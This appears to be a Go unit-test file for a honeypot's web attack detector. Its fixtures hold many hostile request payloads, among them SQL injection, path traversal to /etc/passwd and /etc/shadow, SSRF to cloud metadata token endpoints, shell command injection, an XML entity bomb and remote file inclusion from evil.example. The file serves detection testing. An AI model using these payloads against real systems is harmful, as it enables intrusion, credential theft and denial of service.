package main

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"unicode/utf8"
)

// Reset shared events between handler tests
func resetRecentLogs(t *testing.T) {
	t.Helper()
	logMutex.Lock()
	recentLogs = nil
	logMutex.Unlock()
}

// TestDetectAttack covers the six documented signatures and benign traffic
func TestDetectAttack(t *testing.T) {
	tests := []struct {
		name       string
		path       string
		query      string
		body       string
		attackType string
	}{
		{name: "SQL injection", path: "/api/v1/auth", body: "u=' OR 1=1 --", attackType: "SQL Injection"},
		{name: "double-encoded traversal", path: "/", query: "p=..%252F..%252Fetc%252Fpasswd", attackType: "Path Traversal"},
		{name: "XML external entity", path: "/", body: `<!ENTITY x SYSTEM "file:///etc/passwd">`, attackType: "XML Entity"},
		{name: "command injection", path: "/", query: "cmd=whoami%20%26%26%20id", attackType: "Command Injection"},
		{name: "SSRF", path: "/", query: "url=http://169.254.169.254/latest/meta-data/", attackType: "SSRF"},
		{name: "file inclusion", path: "/", query: "file=php://filter/resource=/etc/passwd", attackType: "LFI/RFI"},
		{name: "benign request", path: "/products", query: "next=release-notes", body: "color=blue", attackType: ""},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			detections := detectAttacks(detectionInput{
				Path:     test.path,
				RawQuery: test.query,
				Body:     test.body,
				Header:   http.Header{"Content-Type": []string{"application/x-www-form-urlencoded"}},
			})
			if test.attackType == "" {
				if len(detections) != 0 {
					t.Fatalf("detectAttacks() = %+v, want no detection", detections)
				}
				return
			}
			if len(detections) != 1 || detections[0].AttackType != test.attackType {
				t.Fatalf("detectAttacks() = %+v, want one %q detection", detections, test.attackType)
			}
		})
	}
}

// TestDetectAttacksCoversCommonEvasions exercises bounded canonicalization and expanded signatures
func TestDetectAttacksCoversCommonEvasions(t *testing.T) {
	tests := []struct {
		name       string
		input      detectionInput
		attackType string
	}{
		{
			name:       "malformed escape beside triple-encoded traversal",
			input:      detectionInput{Path: "/", RawQuery: "noise=%ZZ&p=..%25252f..%25252fetc%25252fpasswd"},
			attackType: "Path Traversal",
		},
		{
			name:       "legacy unicode traversal",
			input:      detectionInput{Path: "/", RawQuery: "p=..%uFF0F..%uFF0Fetc%uFF0Fpasswd"},
			attackType: "Path Traversal",
		},
		{
			name:       "comment-obfuscated union select",
			input:      detectionInput{Path: "/", RawQuery: "id=1%20UN/**/ION%20ALL%20SEL/**/ECT%20password%20FROM%20users"},
			attackType: "SQL Injection",
		},
		{
			name:       "numeric SQL tautology",
			input:      detectionInput{Path: "/", RawQuery: "id=1%20OR%201=1"},
			attackType: "SQL Injection",
		},
		{
			name:       "PostgreSQL time delay",
			input:      detectionInput{Path: "/", RawQuery: "id=1%3BSELECT%20pg_sleep(5)"},
			attackType: "SQL Injection",
		},
		{
			name:       "MySQL executable comment",
			input:      detectionInput{Path: "/", RawQuery: "id=1/*!50000UNION%20SELECT*/password%20FROM%20users"},
			attackType: "SQL Injection",
		},
		{
			name:       "public external XML entity",
			input:      detectionInput{Path: "/", Body: `<!ENTITY % ext PUBLIC "-//example//DTD" "https://example.test/evil.dtd">`},
			attackType: "XML Entity",
		},
		{
			name: "amplifying XML entities",
			input: detectionInput{Path: "/", Body: `<!DOCTYPE x [
				<!ENTITY a "ha">
				<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
				<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
				<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
				<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
				<!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
			]>`},
			attackType: "XML Entity",
		},
		{
			name:       "cyclic XML entities",
			input:      detectionInput{Path: "/", Body: `<!DOCTYPE x [<!ENTITY a "&b;"><!ENTITY b "&a;">]>`},
			attackType: "XML Entity",
		},
		{
			name:       "external XML doctype",
			input:      detectionInput{Path: "/", Body: `<!DOCTYPE x SYSTEM "https://example.test/evil.dtd">`},
			attackType: "XML Entity",
		},
		{
			name:       "XInclude file target",
			input:      detectionInput{Path: "/", Body: `<xi:include href="file:///etc/passwd" parse="text"/>`},
			attackType: "XML Entity",
		},
		{
			name:       "newline command separator",
			input:      detectionInput{Path: "/", RawQuery: "value=hello%0Apowershell%20-enc%20AAAA"},
			attackType: "Command Injection",
		},
		{
			name:       "direct JSON command parameter",
			input:      detectionInput{Path: "/", Body: `{"cmd":"bash"}`},
			attackType: "Command Injection",
		},
		{
			name:       "shell whitespace obfuscation",
			input:      detectionInput{Path: "/", RawQuery: "value=ok%3B%24%7BIFS%7Dwhoami"},
			attackType: "Command Injection",
		},
		{
			name:       "shell whitespace after command",
			input:      detectionInput{Path: "/", RawQuery: "value=ok%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd"},
			attackType: "Command Injection",
		},
		{
			name:       "positional shell whitespace after command",
			input:      detectionInput{Path: "/", RawQuery: "value=ok%3Bcat%24IFS%249%2Fetc%2Fpasswd"},
			attackType: "Command Injection",
		},
		{
			name:       "input redirection after command",
			input:      detectionInput{Path: "/", RawQuery: "value=ok%3Bcat%3C%2Fetc%2Fpasswd"},
			attackType: "Command Injection",
		},
		{
			name:       "output redirection after command",
			input:      detectionInput{Path: "/", RawQuery: "value=ok%3Bid%3E%2Ftmp%2Fresult"},
			attackType: "Command Injection",
		},
		{
			name:       "single ampersand command separator",
			input:      detectionInput{Path: "/", RawQuery: "value=ok%26whoami"},
			attackType: "Command Injection",
		},
		{
			name:       "IPv6 loopback SSRF",
			input:      detectionInput{Path: "/", Body: `{"url":"http://[::1]/admin"}`},
			attackType: "SSRF",
		},
		{
			name: "escaped JSON SSRF",
			input: detectionInput{
				Path:   "/",
				Body:   `{"url":"http:\/\/127.0.0.1\/admin"}`,
				Header: http.Header{"Content-Type": []string{"application/json; charset=utf-8"}},
			},
			attackType: "SSRF",
		},
		{
			name:       "Azure IMDS SSRF",
			input:      detectionInput{Path: "/", RawQuery: "url=http://169.254.169.254/metadata/identity/oauth2/token"},
			attackType: "SSRF",
		},
		{
			name:       "Azure WireServer SSRF",
			input:      detectionInput{Path: "/", RawQuery: "url=http://168.63.129.16/?comp=versions"},
			attackType: "SSRF",
		},
		{
			name:       "decimal IPv4 SSRF",
			input:      detectionInput{Path: "/", RawQuery: "url=http://2130706433/admin"},
			attackType: "SSRF",
		},
		{
			name:       "short IPv4 SSRF",
			input:      detectionInput{Path: "/", RawQuery: "url=http://127.1/admin"},
			attackType: "SSRF",
		},
		{
			name:       "hexadecimal IPv4 SSRF",
			input:      detectionInput{Path: "/", RawQuery: "url=http://0x7f000001/admin"},
			attackType: "SSRF",
		},
		{
			name:       "localhost with trailing dot",
			input:      detectionInput{Path: "/", RawQuery: "url=http://localhost./admin"},
			attackType: "SSRF",
		},
		{
			name:       "carrier-grade internal SSRF",
			input:      detectionInput{Path: "/", RawQuery: "url=http://100.100.100.200/latest/meta-data"},
			attackType: "SSRF",
		},
		{
			name:       "encoded loopback hostname SSRF",
			input:      detectionInput{Path: "/", RawQuery: "url=http://127.0.0.1.nip.io/admin"},
			attackType: "SSRF",
		},
		{
			name:       "local file shadow",
			input:      detectionInput{Path: "/", RawQuery: "file=/etc/shadow"},
			attackType: "LFI/RFI",
		},
		{
			name:       "generic local file query",
			input:      detectionInput{Path: "/", RawQuery: "q=/etc/passwd"},
			attackType: "LFI/RFI",
		},
		{
			name:       "direct sensitive path",
			input:      detectionInput{Path: "/etc/passwd"},
			attackType: "LFI/RFI",
		},
		{
			name:       "generic local file JSON value",
			input:      detectionInput{Path: "/", Body: `{"q":"/proc/self/environ"}`},
			attackType: "LFI/RFI",
		},
		{
			name: "Windows local file",
			input: detectionInput{
				Path:     "/",
				Body:     `file=C:%5CWindows%5Cwin.ini`,
				Header:   http.Header{"Content-Type": []string{"application/x-www-form-urlencoded"}},
				RawQuery: "",
			},
			attackType: "LFI/RFI",
		},
		{
			name: "escaped JSON Windows file",
			input: detectionInput{
				Path:   "/",
				Body:   `{"file":"C:\\Windows\\win.ini"}`,
				Header: http.Header{"Content-Type": []string{"application/problem+json"}},
			},
			attackType: "LFI/RFI",
		},
		{
			name:       "remote file inclusion",
			input:      detectionInput{Path: "/", RawQuery: "page=https://evil.example/shell.txt"},
			attackType: "LFI/RFI",
		},
		{
			name: "traversal in rewrite header",
			input: detectionInput{
				Path:   "/",
				Header: http.Header{"X-Original-Url": []string{"/..%2f..%2fetc/passwd"}},
			},
			attackType: "Path Traversal",
		},
		{
			name: "traversal after long header prefix",
			input: detectionInput{
				Path:   "/",
				Header: http.Header{"X-Original-Url": []string{strings.Repeat("a", maxHeaderBytes+512) + "/../etc/passwd"}},
			},
			attackType: "Path Traversal",
		},
		{
			name: "traversal in repeated header value",
			input: detectionInput{
				Path: "/",
				Header: http.Header{"X-Original-Url": []string{
					strings.Repeat("a", 1024),
					"/../etc/passwd",
				}},
			},
			attackType: "Path Traversal",
		},
		{
			name: "traversal in oversized header suffix",
			input: detectionInput{
				Path:   "/",
				Header: http.Header{"X-Original-Url": []string{strings.Repeat("a", maxDetectionSourceSize+512) + "/../etc/passwd"}},
			},
			attackType: "Path Traversal",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			detections := detectAttacks(test.input)
			if len(detections) != 1 || detections[0].AttackType != test.attackType {
				t.Fatalf("detectAttacks() = %+v, want one %q detection", detections, test.attackType)
			}
		})
	}
}

// TestDetectAttacksKeepsIndependentSourcesIndependent guards against cross-field signatures
func TestDetectAttacksKeepsIndependentSourcesIndependent(t *testing.T) {
	tests := []detectionInput{
		{Path: "/preview/127.0.0.1", Body: "url=https://example.com/release"},
		{Path: "/", RawQuery: "next=https://example.com/releases", Body: "color=blue"},
		{Path: "/", RawQuery: "category=tools&id=42"},
		{Path: "/", RawQuery: "image=data:text/plain,hello"},
		{Path: "/", Body: `<!DOCTYPE note [<!ENTITY writer "Donald Duck">]>`},
		{Path: "/", Body: `<!DOCTYPE doc [<!ENTITY company "Acme"><!ENTITY footer "&company; copyright">]>`},
		{
			Path:   "/",
			Body:   `{"message":"safe,\"url\":\"http:\/\/127.0.0.1\/admin\""}`,
			Header: http.Header{"Content-Type": []string{"application/json"}},
		},
		{Path: "/", RawQuery: "value=ok;catalog=/srv/index"},
		{Path: "/", RawQuery: "value=ok;identity=public"},
		{Path: "/", RawQuery: "url=http://8.8.8.8/status"},
		{Path: "/", RawQuery: "url=http://0x/status"},
		{
			Path: "/",
			Header: http.Header{
				"Cookie":     []string{"theme=dark; release=stable", "id=1 UN/*", "*/ION SELECT password"},
				"Referer":    []string{"https://example.test/docs?id=42"},
				"User-Agent": []string{"Mozilla/5.0 ghoney-docs"},
			},
		},
	}

	for _, input := range tests {
		if detections := detectAttacks(input); len(detections) != 0 {
			t.Fatalf("benign input produced detections: %+v", detections)
		}
	}
}

// TestDetectionNormalizationStaysBounded protects the fixed work per source
func TestDetectionNormalizationStaysBounded(t *testing.T) {
	value := strings.Repeat("%2525", maxDetectionSourceSize)
	variants := normalizeDetectionVariants(value, true)
	if len(variants) > (maxDecodePasses+1)*2 {
		t.Fatalf("variant count = %d, want at most %d", len(variants), (maxDecodePasses+1)*2)
	}
	for _, variant := range variants {
		if len(variant) > maxCanonicalSourceSize {
			t.Fatalf("variant length = %d, want at most %d", len(variant), maxCanonicalSourceSize)
		}
	}
}

// TestDetectionScansEveryAssignment prevents benign parameters from hiding a later target
func TestDetectionScansEveryAssignment(t *testing.T) {
	tests := []struct {
		name       string
		prefix     string
		malicious  string
		attackType string
	}{
		{
			name:       "SSRF after repeated URLs",
			prefix:     "url=https://example.test/status",
			malicious:  "url=http://127.0.0.1/admin",
			attackType: "SSRF",
		},
		{
			name:       "file inclusion after repeated files",
			prefix:     "file=release-notes.txt",
			malicious:  "file=/etc/passwd",
			attackType: "LFI/RFI",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			query := strings.Repeat(test.prefix+"&", 32) + test.malicious
			detections := detectAttacks(detectionInput{Path: "/", RawQuery: query})
			if !hasDetectionType(detections, test.attackType) {
				t.Fatalf("detectAttacks() missed %q after repeated assignments", test.attackType)
			}
		})
	}
}

// TestDetectionCoversTheAcceptedQueryTail keeps payloads beyond MaxHeaderBytes visible
func TestDetectionCoversTheAcceptedQueryTail(t *testing.T) {
	tests := []struct {
		name    string
		padding string
	}{
		{name: "ASCII padding", padding: strings.Repeat("a", maxHeaderBytes+512)},
		{name: "invalid UTF-8 padding", padding: strings.Repeat(string([]byte{0xff}), maxHeaderBytes+512)},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			query := "padding=" + test.padding + "&url=http://127.0.0.1/admin"
			if len(query) >= maxDetectionSourceSize {
				t.Fatalf("test query is %d bytes, want less than %d", len(query), maxDetectionSourceSize)
			}
			detections := detectAttacks(detectionInput{Path: "/", RawQuery: query})
			if !hasDetectionType(detections, "SSRF") {
				t.Fatal("detectAttacks() missed SSRF at the end of an accepted query")
			}
		})
	}
}

// TestDetectAttacksReturnsDistinctClasses preserves every family in a mixed request
func TestDetectAttacksReturnsDistinctClasses(t *testing.T) {
	detections := detectAttacks(detectionInput{
		Path:     "/",
		RawQuery: "p=../../etc/passwd&id=1%20UNION%20SELECT%20password%20FROM%20users&cmd=whoami%26%26id&file=php://filter/resource=/etc/passwd",
	})
	got := detectionTypes(detections)
	want := []string{"Path Traversal", "SQL Injection", "Command Injection", "LFI/RFI"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("detection types = %v, want %v", got, want)
	}
}

// hasDetectionType checks one fixed class without depending on details wording
func hasDetectionType(detections []detection, attackType string) bool {
	for _, detection := range detections {
		if detection.AttackType == attackType {
			return true
		}
	}
	return false
}

// detectionTypes returns stable classes for exact ordering assertions
func detectionTypes(detections []detection) []string {
	types := make([]string, 0, len(detections))
	for _, detection := range detections {
		types = append(types, detection.AttackType)
	}
	return types
}

// TestRequestInspectionScansTheFullAllowedBody checks beyond the stored snippet
func TestRequestInspectionScansTheFullAllowedBody(t *testing.T) {
	resetRecentLogs(t)
	body := strings.Repeat("a", maxBodySnippetSize+50) + ";whoami"
	request := httptest.NewRequest(http.MethodPost, "http://example.test/", strings.NewReader(body))
	request.RemoteAddr = "192.0.2.10:1234"
	recorder := httptest.NewRecorder()
	nextCalled := false
	handler := requestInspectionMiddleware(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		nextCalled = true
		w.WriteHeader(http.StatusNoContent)
	}))

	handler.ServeHTTP(recorder, request)

	if !nextCalled || recorder.Code != http.StatusNoContent {
		t.Fatalf("request was not forwarded successfully: called=%v status=%d", nextCalled, recorder.Code)
	}
	logMutex.Lock()
	defer logMutex.Unlock()
	if len(recentLogs) != 1 || recentLogs[0].AttackType != "Command Injection" {
		t.Fatalf("full body was not classified: logs=%+v", recentLogs)
	}
	if len(recentLogs[0].BodySnippet) > maxBodySnippetSize {
		t.Fatalf("stored body snippet exceeds %d bytes", maxBodySnippetSize)
	}
}

// TestRequestInspectionStoresEachDistinctDetection covers middleware fan-out
func TestRequestInspectionStoresEachDistinctDetection(t *testing.T) {
	resetRecentLogs(t)
	request := httptest.NewRequest(
		http.MethodGet,
		"http://example.test/?p=../../etc/passwd&id=1%20UNION%20SELECT%20password%20FROM%20users&cmd=whoami%26%26id&file=php://filter/resource=/etc/passwd",
		nil,
	)
	request.RemoteAddr = "192.0.2.20:1234"
	recorder := httptest.NewRecorder()
	handler := requestInspectionMiddleware(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	}))

	handler.ServeHTTP(recorder, request)

	if recorder.Code != http.StatusNoContent {
		t.Fatalf("status = %d, want %d", recorder.Code, http.StatusNoContent)
	}
	logMutex.Lock()
	defer logMutex.Unlock()
	got := make([]string, 0, len(recentLogs))
	for _, entry := range recentLogs {
		got = append(got, entry.AttackType)
	}
	want := []string{"Path Traversal", "SQL Injection", "Command Injection", "LFI/RFI"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("stored detection types = %v, want %v", got, want)
	}
}

// TestRequestInspectionRejectsOversizedBodies covers fixed and streamed bodies
func TestRequestInspectionRejectsOversizedBodies(t *testing.T) {
	for _, streamed := range []bool{false, true} {
		name := "fixed length"
		if streamed {
			name = "streamed"
		}
		t.Run(name, func(t *testing.T) {
			resetRecentLogs(t)
			request := httptest.NewRequest(http.MethodPost, "http://example.test/", strings.NewReader(strings.Repeat("x", maxRequestBodySize+1)))
			if streamed {
				request.ContentLength = -1
			}
			recorder := httptest.NewRecorder()
			nextCalled := false
			handler := requestInspectionMiddleware(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {
				nextCalled = true
			}))

			handler.ServeHTTP(recorder, request)

			if nextCalled {
				t.Fatal("oversized request reached the next handler")
			}
			if recorder.Code != http.StatusRequestEntityTooLarge {
				t.Fatalf("status = %d, want %d", recorder.Code, http.StatusRequestEntityTooLarge)
			}
		})
	}
}

// TestMetricLabelsStayBounded keeps attacker input out of Prometheus labels
func TestMetricLabelsStayBounded(t *testing.T) {
	for index := 0; index < 1000; index++ {
		path := "/scanner/" + strings.Repeat("x", index%50) + string(rune('a'+index%26))
		if route := metricRoute(path); route != unknownMetricRoute {
			t.Fatalf("metricRoute(%q) = %q, want %q", path, route, unknownMetricRoute)
		}
	}
	if method := metricMethod("CUSTOM-" + strings.Repeat("X", 100)); method != unknownMetricMethod {
		t.Fatalf("metricMethod() = %q, want %q", method, unknownMetricMethod)
	}
	if route := metricRoute("/static/app.js"); route != "/static/*" {
		t.Fatalf("static route = %q, want /static/*", route)
	}
}

// TestAdministrativeSurfaceIsSeparate checks the two route sets
func TestAdministrativeSurfaceIsSeparate(t *testing.T) {
	resetRecentLogs(t)
	adminRequest := httptest.NewRequest(http.MethodGet, "http://example.test/admin", nil)
	adminResponse := httptest.NewRecorder()
	publicHandler().ServeHTTP(adminResponse, adminRequest)
	if adminResponse.Code != http.StatusOK {
		t.Fatalf("public decoy status = %d, want %d", adminResponse.Code, http.StatusOK)
	}

	dashboardRequest := httptest.NewRequest(http.MethodGet, "http://example.test/dashboard", nil)
	dashboardResponse := httptest.NewRecorder()
	adminHandler().ServeHTTP(dashboardResponse, dashboardRequest)
	if dashboardResponse.Code != http.StatusOK {
		t.Fatalf("admin dashboard status = %d, want %d", dashboardResponse.Code, http.StatusOK)
	}

	decoyOnAdminRequest := httptest.NewRequest(http.MethodGet, "http://example.test/admin", nil)
	decoyOnAdminResponse := httptest.NewRecorder()
	adminHandler().ServeHTTP(decoyOnAdminResponse, decoyOnAdminRequest)
	if decoyOnAdminResponse.Code != http.StatusNotFound {
		t.Fatalf("decoy on admin status = %d, want %d", decoyOnAdminResponse.Code, http.StatusNotFound)
	}
}

// TestSecurityHeadersRejectInlineScripts keeps inline execution out of the CSP
func TestSecurityHeadersRejectInlineScripts(t *testing.T) {
	request := httptest.NewRequest(http.MethodGet, "http://example.test/health", nil)
	response := httptest.NewRecorder()
	adminHandler().ServeHTTP(response, request)

	policy := response.Header().Get("Content-Security-Policy")
	if strings.Contains(policy, "unsafe-inline") {
		t.Fatalf("CSP unexpectedly permits inline content: %q", policy)
	}
	if !strings.Contains(policy, "object-src 'none'") || !strings.Contains(policy, "frame-ancestors 'none'") {
		t.Fatalf("CSP is missing required isolation directives: %q", policy)
	}
}

// TestTruncateUTF8 preserves valid UTF-8 within the byte cap
func TestTruncateUTF8(t *testing.T) {
	value := strings.Repeat("é", 20)
	truncated := truncateUTF8(value, 11)
	if len(truncated) > 11 {
		t.Fatalf("truncated value is %d bytes, want at most 11", len(truncated))
	}
	if !utf8.ValidString(truncated) {
		t.Fatal("truncated value is not valid UTF-8")
	}

	// Replacement runes expand invalid input and still count toward the cap
	repaired := truncateUTF8(string([]byte{0xff, 'a', 0xfe, 'b'}), 4)
	if len(repaired) > 4 {
		t.Fatalf("repaired value is %d bytes, want at most 4", len(repaired))
	}
	if !utf8.ValidString(repaired) {
		t.Fatal("repaired value is not valid UTF-8")
	}
}

// TestFakeJWTUsesFreshValidClaims checks decoy token shape and lifetime
func TestFakeJWTUsesFreshValidClaims(t *testing.T) {
	token, err := newFakeJWT()
	if err != nil {
		t.Fatalf("newFakeJWT() error = %v", err)
	}
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		t.Fatalf("JWT has %d parts, want 3", len(parts))
	}
	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		t.Fatalf("decode JWT payload: %v", err)
	}
	var claims struct {
		Issued  int64 `json:"iat"`
		Expires int64 `json:"exp"`
	}
	if err := json.Unmarshal(payload, &claims); err != nil {
		t.Fatalf("decode JWT claims: %v", err)
	}
	if claims.Expires <= claims.Issued {
		t.Fatalf("JWT expiration %d is not after issued-at %d", claims.Expires, claims.Issued)
	}
	if lifetime := claims.Expires - claims.Issued; lifetime < 899 || lifetime > 901 {
		t.Fatalf("JWT lifetime = %d seconds, want approximately 15 minutes", lifetime)
	}
}
